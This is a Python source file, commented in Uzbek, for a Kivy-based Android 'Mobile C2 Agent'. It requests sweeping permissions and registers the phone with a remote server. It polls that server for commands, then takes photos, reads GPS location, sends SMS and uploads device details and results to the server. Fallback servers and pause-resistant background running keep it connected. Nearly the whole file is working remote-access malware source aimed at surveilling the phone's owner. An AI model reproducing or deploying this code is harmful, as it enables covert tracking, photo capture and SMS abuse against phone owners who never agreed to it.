"""
Mobile Agent (Android) - Kivy asosida
Multi-protocol, Auto-reconnect, Self-preservation
Termux'siz ishlaydi - Kivy embedded Python bilan
"""

import os
import sys
import time
import json
import platform
import threading
from datetime import datetime

# Kivy imports
try:
    from kivy.app import App
    from kivy.clock import Clock
    from kivy.utils import platform as kivy_platform
    KIVY_AVAILABLE = True
except ImportError:
    KIVY_AVAILABLE = False
    print("⚠️ Kivy topilmadi - faqat test rejimida")

# Android-specific imports
if KIVY_AVAILABLE and kivy_platform == 'android':
    from jnius import autoclass, cast
    from android.permissions import request_permissions, Permission
    from android.runnable import run_on_ui_thread
    
    # Android classes
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    Intent = autoclass('android.content.Intent')
    PendingIntent = autoclass('android.app.PendingIntent')
    AndroidString = autoclass('java.lang.String')
    Context = autoclass('android.content.Context')
    
    # Plyer imports (cross-platform)
    try:
        from plyer import battery, vibrator, gps, sms, camera
        PLYER_AVAILABLE = True
    except ImportError:
        PLYER_AVAILABLE = False
        print("⚠️ Plyer topilmadi")

# HTTP client
try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False
    # Fallback to urllib
    import urllib.request
    import urllib.error


class MobileAgent:
    """Android uchun to'liq agent"""
    
    def __init__(self, server_host, server_port=8000, protocol='http'):
        self.server_host = server_host
        self.server_port = server_port
        self.protocol = protocol
        self.session_id = None
        self.running = True
        
        # Fallback servers
        self.servers = [{'host': server_host, 'port': server_port, 'protocol': protocol}]
        self.current_server_index = 0
        
        # Reconnection
        self.retry_delay = 10  # Mobile da sekinroq
        self.max_retries = 3
        self.connection_failed_count = 0
        
        # Heartbeat
        self.heartbeat_interval = 30  # Mobile da uzunroq (battery save)
        
        # Agent ID
        self.agent_id = self._generate_agent_id()
        
        # Platform
        self.is_android = KIVY_AVAILABLE and kivy_platform == 'android'
        
        print(f"📱 Mobile Agent ishga tushirildi")
        print(f"   Agent ID: {self.agent_id}")
        print(f"   Platform: {'Android' if self.is_android else 'Desktop'}")
        print(f"   Protocol: {protocol.upper()}")
        print(f"   Server: {server_host}:{server_port}")
        
        # Request permissions (Android)
        if self.is_android:
            self._request_permissions()
    
    def _generate_agent_id(self):
        """Unique agent ID"""
        import uuid
        
        # Android device ID
        device_id = "unknown"
        if self.is_android:
            try:
                context = PythonActivity.mActivity
                android_id = autoclass('android.provider.Settings$Secure').getString(
                    context.getContentResolver(),
                    autoclass('android.provider.Settings$Secure').ANDROID_ID
                )
                device_id = android_id
            except:
                pass
        
        return f"mobile_{device_id}_{uuid.uuid4().hex[:8]}"
    
    def _request_permissions(self):
        """Android permissions so'rash"""
        permissions = [
            Permission.INTERNET,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.CAMERA,
            Permission.READ_SMS,
            Permission.SEND_SMS,
            Permission.READ_CONTACTS,
            Permission.READ_CALL_LOG,
            Permission.VIBRATE,
            Permission.WAKE_LOCK,
            Permission.RECEIVE_BOOT_COMPLETED,
            Permission.FOREGROUND_SERVICE
        ]
        
        try:
            request_permissions(permissions)
            print("✅ Permissions so'ralmoqda...")
        except Exception as e:
            print(f"⚠️ Permissions xatosi: {e}")
    
    def add_fallback_server(self, host, port=8000, protocol='http'):
        """Fallback server qo'shish"""
        self.servers.append({'host': host, 'port': port, 'protocol': protocol})
        print(f"➕ Fallback server: {protocol}://{host}:{port}")
    
    def _http_request(self, url, method='GET', data=None, timeout=15):
        """HTTP request (requests yoki urllib)"""
        try:
            if REQUESTS_AVAILABLE:
                # requests library
                if method == 'GET':
                    response = requests.get(url, timeout=timeout)
                else:
                    response = requests.post(url, json=data, timeout=timeout)
                
                return response.json() if response.status_code == 200 else None
            
            else:
                # urllib fallback
                if method == 'POST' and data:
                    data_bytes = json.dumps(data).encode('utf-8')
                    req = urllib.request.Request(
                        url,
                        data=data_bytes,
                        headers={'Content-Type': 'application/json'},
                        method='POST'
                    )
                else:
                    req = urllib.request.Request(url, method='GET')
                
                with urllib.request.urlopen(req, timeout=timeout) as response:
                    return json.loads(response.read().decode())
                    
        except Exception as e:
            print(f"⚠️ HTTP request xatosi: {e}")
            return None
    
    def register(self):
        """Serverga ro'yxatdan o'tish"""
        while True:
            try:
                url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/register/"
                
                payload = {
                    'agent_id': self.agent_id,
                    'hostname': self._get_device_name(),
                    'platform': 'Android',
                    'os_version': self._get_android_version(),
                    'ip_address': self._get_local_ip(),
                    'protocol': self.protocol,
                    'system_info': self._get_system_info()
                }
                
                result = self._http_request(url, method='POST', data=payload)
                
                if result:
                    self.session_id = result.get('session_id')
                    print(f"✅ Ro'yxatdan o'tdik")
                    print(f"   Session ID: {self.session_id}")
                    self.connection_failed_count = 0
                    return True
                    
            except Exception as e:
                print(f"❌ Ro'yxatdan o'tish xatosi: {e}")
            
            self.connection_failed_count += 1
            
            if self.connection_failed_count >= self.max_retries:
                print(f"⚠️ {self.max_retries} marta xato, keyingi serverga o'tilmoqda...")
                self._switch_to_next_server()
                self.connection_failed_count = 0
            
            print(f"⏳ {self.retry_delay}s kutish...")
            time.sleep(self.retry_delay)
    
    def _switch_to_next_server(self):
        """Keyingi serverga o'tish"""
        if len(self.servers) <= 1:
            return
        
        self.current_server_index = (self.current_server_index + 1) % len(self.servers)
        next_server = self.servers[self.current_server_index]
        
        self.server_host = next_server['host']
        self.server_port = next_server['port']
        self.protocol = next_server.get('protocol', 'http')
        
        print(f"🔄 Yangi server: {self.protocol}://{self.server_host}:{self.server_port}")
    
    def heartbeat(self):
        """Server bilan aloqa"""
        try:
            url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/heartbeat/"
            
            payload = {
                'agent_id': self.agent_id,
                'status': 'active',
                'protocol': self.protocol,
                'battery': self._get_battery_info(),
                'timestamp': datetime.now().isoformat()
            }
            
            result = self._http_request(url, method='POST', data=payload)
            
            if result:
                # Ulanish tiklandi
                if self.connection_failed_count > 0:
                    print("✅ Ulanish tiklandi!")
                    self.connection_failed_count = 0
                
                # Komandalar
                if 'commands' in result and result['commands']:
                    for cmd in result['commands']:
                        self._execute_command(cmd)
            else:
                raise Exception("Heartbeat javob yo'q")
                
        except Exception as e:
            print(f"⚠️ Heartbeat xatosi: {e}")
            self.connection_failed_count += 1
            
            if self.connection_failed_count >= self.max_retries:
                print("🔄 Keyingi serverga o'tilmoqda...")
                self._switch_to_next_server()
                self.connection_failed_count = 0
                self.register()
    
    def _execute_command(self, command):
        """Komandani bajarish"""
        try:
            cmd_type = command.get('type', '').lower()
            cmd_data = command.get('data', '')
            
            print(f"📥 Komanda: {cmd_type}")
            
            if cmd_type == 'sysinfo':
                result = self._get_system_info()
            elif cmd_type == 'battery':
                result = self._get_battery_info()
            elif cmd_type == 'location':
                result = self._get_location()
            elif cmd_type == 'vibrate':
                result = self._vibrate(cmd_data)
            elif cmd_type == 'sms_send':
                result = self._send_sms(cmd_data)
            elif cmd_type == 'sms_read':
                result = self._read_sms()
            elif cmd_type == 'contacts':
                result = self._get_contacts()
            elif cmd_type == 'camera':
                result = self._take_photo()
            else:
                result = {'error': f'Noma\'lum komanda: {cmd_type}'}
            
            self._send_result(command.get('id'), result)
            
        except Exception as e:
            print(f"❌ Komanda xatosi: {e}")
            self._send_result(command.get('id'), {'error': str(e)})
    
    def _get_system_info(self):
        """System info"""
        info = {
            'agent_id': self.agent_id,
            'platform': 'Android' if self.is_android else 'Desktop',
            'device_name': self._get_device_name(),
            'android_version': self._get_android_version(),
            'ip_address': self._get_local_ip(),
            'battery': self._get_battery_info()
        }
        
        if self.is_android:
            try:
                # Android-specific info
                build = autoclass('android.os.Build')
                info['manufacturer'] = build.MANUFACTURER
                info['model'] = build.MODEL
                info['device'] = build.DEVICE
                info['sdk_version'] = build.VERSION.SDK_INT
            except:
                pass
        
        return info
    
    def _get_device_name(self):
        """Device name"""
        if self.is_android:
            try:
                build = autoclass('android.os.Build')
                return f"{build.MANUFACTURER} {build.MODEL}"
            except:
                return "Android Device"
        return platform.node()
    
    def _get_android_version(self):
        """Android version"""
        if self.is_android:
            try:
                build = autoclass('android.os.Build')
                return build.VERSION.RELEASE
            except:
                return "Unknown"
        return platform.system()
    
    def _get_local_ip(self):
        """Local IP"""
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'
    
    def _get_battery_info(self):
        """Battery info"""
        if PLYER_AVAILABLE:
            try:
                status = battery.status
                return {
                    'percentage': status.get('percentage', 0),
                    'isCharging': status.get('isCharging', False)
                }
            except:
                pass
        return {'percentage': 0, 'isCharging': False}
    
    def _get_location(self):
        """GPS location"""
        if PLYER_AVAILABLE and self.is_android:
            try:
                gps.configure(on_location=lambda **kwargs: kwargs)
                gps.start(minTime=1000, minDistance=0)
                time.sleep(2)  # Wait for GPS
                
                location = gps.get_last_known_location()
                gps.stop()
                
                if location:
                    return {
                        'success': True,
                        'latitude': location.get('lat', 0),
                        'longitude': location.get('lon', 0),
                        'accuracy': location.get('accuracy', 0)
                    }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'GPS mavjud emas'}
    
    def _vibrate(self, duration=1):
        """Vibrate"""
        if PLYER_AVAILABLE:
            try:
                vibrator.vibrate(duration)
                return {'success': True, 'duration': duration}
            except Exception as e:
                return {'success': False, 'error': str(e)}
        return {'success': False, 'error': 'Vibrator mavjud emas'}
    
    def _send_sms(self, data):
        """SMS yuborish"""
        if PLYER_AVAILABLE and self.is_android:
            try:
                phone = data.get('phone')
                message = data.get('message')
                
                sms.send(recipient=phone, message=message)
                
                return {
                    'success': True,
                    'phone': phone,
                    'message': message
                }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'SMS mavjud emas'}
    
    def _read_sms(self):
        """SMS o'qish"""
        # Bu android.permissions va content resolver kerak
        # Plyer'da to'liq SMS read yo'q, jnius kerak
        return {'success': False, 'error': 'SMS read hozircha qo\'llab-quvvatlanmaydi'}
    
    def _get_contacts(self):
        """Kontaktlar"""
        # content resolver kerak
        return {'success': False, 'error': 'Contacts hozircha qo\'llab-quvvatlanmaydi'}
    
    def _take_photo(self):
        """Rasm olish"""
        if PLYER_AVAILABLE:
            try:
                # Camera path
                photo_path = '/sdcard/DCIM/agent_photo.jpg'
                camera.take_picture(filename=photo_path, on_complete=lambda x: x)
                
                time.sleep(2)  # Wait for camera
                
                # Base64 encode
                if os.path.exists(photo_path):
                    import base64
                    with open(photo_path, 'rb') as f:
                        photo_data = base64.b64encode(f.read()).decode()
                    
                    os.remove(photo_path)  # Cleanup
                    
                    return {
                        'success': True,
                        'photo': photo_data,
                        'size': len(photo_data)
                    }
            except Exception as e:
                return {'success': False, 'error': str(e)}
        
        return {'success': False, 'error': 'Camera mavjud emas'}
    
    def _send_result(self, command_id, result):
        """Natijani yuborish"""
        try:
            url = f"{self.protocol}://{self.server_host}:{self.server_port}/api/agents/{self.agent_id}/result/"
            
            payload = {
                'agent_id': self.agent_id,
                'command_id': command_id,
                'result': result,
                'timestamp': datetime.now().isoformat()
            }
            
            response = self._http_request(url, method='POST', data=payload)
            
            if response:
                print("✅ Natija yuborildi")
            else:
                print("⚠️ Natija yuborishda xato")
                
        except Exception as e:
            print(f"⚠️ Natija yuborish xatosi: {e}")
    
    def run_background(self):
        """Background threadda ishga tushirish"""
        def background_worker():
            # Ro'yxatdan o'tish
            self.register()
            
            # Heartbeat loop
            while self.running:
                try:
                    self.heartbeat()
                    time.sleep(self.heartbeat_interval)
                except Exception as e:
                    print(f"❌ Background worker xatosi: {e}")
                    time.sleep(self.retry_delay)
        
        thread = threading.Thread(target=background_worker, daemon=True)
        thread.start()
        print("🔄 Background worker ishga tushdi")


class MobileAgentApp(App):
    """Kivy App wrapper"""
    
    def __init__(self, server_host, server_port=8000, protocol='http', **kwargs):
        super().__init__(**kwargs)
        self.agent = MobileAgent(server_host, server_port, protocol)
    
    def build(self):
        """Build UI (yoki UI-siz)"""
        from kivy.uix.label import Label
        
        # Background worker ishga tushirish
        self.agent.run_background()
        
        # Minimal UI
        return Label(
            text='Agent ishlamoqda...\n(Background service)',
            halign='center',
            font_size='20sp'
        )
    
    def on_start(self):
        """App start"""
        print("📱 Mobile Agent App started")
    
    def on_pause(self):
        """App pause - background da davom etish"""
        return True  # True = pause qilinganda ham ishlaydi
    
    def on_resume(self):
        """App resume"""
        pass
    
    def on_stop(self):
        """App stop"""
        self.agent.running = False
        print("⏹️ Mobile Agent stopped")


def main():
    """Main entry point"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Mobile C2 Agent (Android)')
    parser.add_argument('server', help='Server URL yoki IP')
    parser.add_argument('--port', type=int, default=8000, help='Port (default: 8000)')
    parser.add_argument('--protocol', choices=['http', 'https'], default='http', help='Protocol')
    parser.add_argument('--interval', type=int, default=30, help='Heartbeat interval (s)')
    parser.add_argument('--fallback', nargs='+', help='Fallback servers (IP:PORT:PROTOCOL)')
    
    args = parser.parse_args()
    
    # Server parse
    server_url = args.server
    if server_url.startswith('http://') or server_url.startswith('https://'):
        from urllib.parse import urlparse
        parsed = urlparse(server_url)
        server_host = parsed.hostname
        server_port = parsed.port or args.port
        protocol = parsed.scheme
    else:
        server_host = server_url
        server_port = args.port
        protocol = args.protocol
    
    if KIVY_AVAILABLE:
        # Kivy app
        app = MobileAgentApp(server_host, server_port, protocol)
        
        # Fallback servers
        if args.fallback:
            for fb in args.fallback:
                parts = fb.split(':')
                if len(parts) >= 2:
                    app.agent.add_fallback_server(parts[0], int(parts[1]), parts[2] if len(parts) > 2 else 'http')
        
        app.agent.heartbeat_interval = args.interval
        app.run()
    else:
        print("❌ Kivy topilmadi - mobile agent ishlamaydi")
        print("   Kivy o'rnating: pip install kivy")


if __name__ == '__main__':
    main()
